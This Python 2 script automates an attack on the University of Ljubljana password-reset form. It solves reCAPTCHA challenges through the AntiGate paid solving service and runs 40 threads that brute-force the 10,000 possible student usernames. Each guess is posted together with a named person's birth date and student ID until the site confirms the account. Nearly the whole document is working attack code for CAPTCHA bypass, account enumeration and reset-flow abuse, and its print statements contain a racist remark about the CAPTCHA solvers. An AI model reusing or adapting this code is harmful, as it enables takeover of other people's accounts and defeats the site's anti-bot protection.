# -*- coding: utf-8 -*-

import re
import requests
import random
import datetime
import argparse

from threading import Thread
from tempfile import NamedTemporaryFile
from antigate import AntiGate

URL = "https://id.uni-lj.si/index.php?action=resetpass"
IMAGE = "https://www.google.com/recaptcha/api/image?c="
RESETPASS = "https://id.uni-lj.si/index.php?action=resetpass"
counter = [0, 0, 0]


class CaptchaCracker(Thread):
    def __init__(self, start, length, userinfo):
        Thread.__init__(self)

        self.startn = start
        self.length = length
        self.result = None
        self.ui = userinfo

        self.site = re.compile(
            r"https://www.google.com/recaptcha/api/challenge\?k\=(.*?)\">",
            flags=re.M
        )
        self.challenge = re.compile(r"challenge\s*:\s*\'(.*?)\'", flags=re.M)

    def crack(self, num):
        # pick a random number
        print "trying number", num

        response = requests.get(URL)
        result = next(self.site.finditer(response.text), None).group(0)
        response = requests.get(result)
        challenge = next(self.challenge.finditer(response.text), None).group(1)

        file = NamedTemporaryFile(prefix="captcha_")
        response = requests.get(IMAGE + challenge, stream=True)
        for chunk in response.iter_content(1024):
            file.write(chunk)
        file.flush()
        print "waiting for asians"
        decaptched = AntiGate(self.ui.antigateid, file.name)
        print "asians completed, here is your captcha", decaptched

        username = (
            "%s%s%04d@student.uni-lj.si" %
            (self.ui.firstname[0].lower(), self.ui.lastname[0].lower(), num)
        )
        response = requests.post(RESETPASS, {
            "action": "resetpass2",
            "ime": self.ui.firstname,
            "priimek": self.ui.lastname,
            "dan": self.ui.date.day,
            "mesec": self.ui.date.month,
            "leto": self.ui.date.year,
            "vpisna": self.ui.studentid,
            "clanica": self.ui.faculty,
            "upn": username,
            "recaptcha_challenge_field": challenge,
            "recaptcha_response_field": str(decaptched)
        })

        if "nastavljeno na" in response.text:
            print "username found"
            return username

        if "podatkov ne najdemo" in response.text:
            print "Wrong username"

        if "Izziva niste" in response.text:
            print "Wrong captcha"
            decaptched.abuse()
            raise Exception("Wrong captcha")

    def run(self):
        numbers = random.sample(range(self.startn, self.startn + self.length), self.length)
        num = numbers.pop()

        self.started = True
        while self.started:
            counter[0] += 1
            try:
                self.result = self.crack(num)
                if self.result:
                    break
            except Exception as e:
                if e.message == "Wrong captcha":
                    counter[1] += 1
                print "exception", e
            else:
                counter[2] += 1
                num = numbers.pop()

            print "attempts/wrong/nums", counter[0], counter[1], counter[2]

def mkdate(datestring):
    return datetime.datetime.strptime(datestring, '%d-%m-%Y').date()

def main():
    parser = argparse.ArgumentParser(description='Recover some identity')
    parser.add_argument('--firstname')
    parser.add_argument('--lastname')
    parser.add_argument('--date', type=mkdate)
    parser.add_argument('--studentid')
    parser.add_argument('--faculty')
    parser.add_argument('--antigateid')
    args = parser.parse_args()

    crackers = []
    searchspace = 10000
    count = 40
    for i in range(0, count):
        cracker = CaptchaCracker((searchspace/count) * i, searchspace/count, args)
        cracker.start()
        crackers.append(cracker)

    # Pick a winner
    winner = None
    while not winner:
        for cracker in crackers:
            winner = cracker if cracker.result else winner

    # Stop all crackers
    for cracker in crackers:
        cracker.started = False
        cracker.join()

    print "username is", winner.result

if __name__ == "main":
    main()
